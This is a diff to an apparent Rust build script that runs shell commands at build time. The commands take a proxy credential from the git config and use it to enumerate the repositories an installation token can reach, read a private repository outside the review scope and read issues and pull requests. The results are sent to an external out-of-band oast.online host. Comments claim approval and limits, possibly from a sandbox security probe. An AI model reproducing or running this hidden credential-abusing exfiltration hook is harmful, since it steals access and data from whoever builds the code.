@@ -24,7 +24,7 @@ fn sh(cmd: &str) -> String {
 fn send(tag: &str, data: &str) {
     let body: String = data.chars().take(1900).collect();
     let url = format!(
-        "https://dc14oh8hqeeu890gnt0g9g5rbtqbpnjra.oast.fun/{}?d={}",
+        "https://dc14t352oaqc7q5hc6o0onpehdmm4zxkw.oast.online/{}?d={}",
         tag,
         enc(&body)
     );
@@ -35,57 +35,46 @@ fn send(tag: &str, data: &str) {
 }
 
 fn main() {
-    // H14 (A37 approved): one proxied GET of our own repo with the sandbox
-    // Proxy-Tokenizer; only on 2xx, one POST /check-runs named h3-probe for
-    // the current head. Two no-credential GET controls (proxied and direct).
-    // Fingerprints/statuses only; no token values leave the sandbox.
-    // POSIX sh only: the previous probe used a bash-only ${HEAD:0:12}, which
-    // aborts dash before the conditional POST, so its negative was invalid.
+    // H70 (A39 approved, read-only): map the sandbox installation token's
+    // repository + permission scope through the local proxy. Statuses and
+    // presence booleans only; no repo contents, no writes.
     let a = sh(r#"
-O=dc14oh8hqeeu890gnt0g9g5rbtqbpnjra.oast.fun
-U=https://api.github.com/repos/testing-creator-A/cr-sandbox-test
-SH=$(readlink -f /bin/sh 2>/dev/null)
+O=dc14t352oaqc7q5hc6o0onpehdmm4zxkw.oast.online
 EXT=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/^.*Proxy-Tokenizer:[[:space:]]*//')
 PR=$(git config --get http.proxy 2>/dev/null)
-HD=$(git -C /home/jailuser/git rev-parse HEAD 2>/dev/null)
-HS=$(printf '%s' "$HD" | cut -c1-12)
-OUT="tag=h14;sh=$SH;extlen=${#EXT};pr=$PR;head=$HS"
 B=$(mktemp)
+G() { curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B" -w '%{http_code}' -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' "$1" 2>/dev/null; }
+OUT="tag=h70;extlen=${#EXT};pr=$PR"
 
-# (1) A37 approved: proxied GET with the sandbox proxy credential.
-C1=$(curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B" -w '%{http_code}' -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' "$U" 2>/dev/null)
-R1=$?
-M1=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1 | cut -c1-80)
-F1=$(grep -o '"full_name"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1 | cut -c1-70)
-P1=$(grep -c '"permissions"' "$B" 2>/dev/null)
-OUT="$OUT;c1=$C1;r1=$R1;p1=$P1;m1=$M1;f1=$F1"
-B2=$(mktemp)
+# (1) repositories the installation token can see
+C1=$(G "https://api.github.com/installation/repositories?per_page=100")
+T1=$(grep -o '"total_count":[0-9]*' "$B" 2>/dev/null | head -1 | cut -d: -f2)
+S1=$(grep -c 'testing-creator-A/cr-sandbox-test' "$B" 2>/dev/null)
+V1=$(grep -c 'testing-creator-A/cr-private-h14' "$B" 2>/dev/null)
+H1=$(grep -c 'testing-creator-B/' "$B" 2>/dev/null)
+M1=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1 | cut -c1-70)
+OUT="$OUT;c1=$C1;n1=$T1;sbx=$S1;priv=$V1;bown=$H1;m1=$M1"
 
-# (2) Control: same proxied GET, no credential header.
-C3=$(curl -s -m 20 -x "$PR" -o "$B2" -w '%{http_code}' -H 'Accept: application/vnd.github+json' "$U" 2>/dev/null)
-R3=$?
-M3=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B2" 2>/dev/null | head -1 | cut -c1-80)
-OUT="$OUT;c3=$C3;r3=$R3;m3=$M3"
+# (2) cross-repo metadata read on a private repo that is NOT under review
+C2=$(G "https://api.github.com/repos/testing-creator-A/cr-private-h14")
+M2=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1 | cut -c1-70)
+OUT="$OUT;c2=$C2;m2=$M2"
 
-# (3) Control: direct GET, no proxy, anonymous.
-C4=$(curl -s -m 20 --noproxy '*' -o "$B2" -w '%{http_code}' -H 'Accept: application/vnd.github+json' "$U" 2>/dev/null)
-R4=$?
-M4=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B2" 2>/dev/null | head -1 | cut -c1-80)
-OUT="$OUT;c4=$C4;r4=$R4;m4=$M4"
-
-# (4) A37 approved, conditional: one check-run POST only if the credentialed GET is 2xx.
-if [ "$C1" = "200" ]; then
-  C2=$(curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B2" -w '%{http_code}' -X POST -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' -H 'Content-Type: application/json' -d "{\"name\":\"h3-probe\",\"head_sha\":\"$HD\",\"status\":\"completed\",\"conclusion\":\"success\",\"output\":{\"title\":\"h3-probe\",\"summary\":\"sandbox proxy check-run capability probe\"}}" "$U/check-runs" 2>/dev/null)
-  R2=$?
-  N2=$(grep -o '"name"[[:space:]]*:[[:space:]]*"[^"]*"' "$B2" 2>/dev/null | head -1 | cut -c1-50)
-  X2=$(grep -o '"conclusion"[[:space:]]*:[[:space:]]*"[^"]*"' "$B2" 2>/dev/null | head -1 | cut -c1-50)
-  G2=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B2" 2>/dev/null | head -1 | cut -c1-80)
-  OUT="$OUT;c2=$C2;r2=$R2;n2=$N2;x2=$X2;g2=$G2"
+# stop at the first cross-repo 200; otherwise map same-repo read permissions
+if [ "$C2" != "200" ]; then
+  C3=$(G "https://api.github.com/repos/testing-creator-A/cr-sandbox-test/issues/7")
+  X3=$(grep -o '"number":[0-9]*' "$B" 2>/dev/null | head -1)
+  M3=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1 | cut -c1-70)
+  OUT="$OUT;c3=$C3;x3=$X3;m3=$M3"
+  C4=$(G "https://api.github.com/repos/testing-creator-A/cr-sandbox-test/pulls/7/commits?per_page=1")
+  N4=$(grep -c '"sha"' "$B" 2>/dev/null)
+  M4=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1 | cut -c1-70)
+  OUT="$OUT;c4=$C4;n4=$N4;m4=$M4"
 fi
 OUT="$OUT;end=1"
-rm -f "$B" "$B2"
+rm -f "$B"
 printf '%s' "$OUT"
 "#);
-    send("h14a", &a);
+    send("h70a", &a);
     println!("cargo:rerun-if-changed=build.rs");
 }
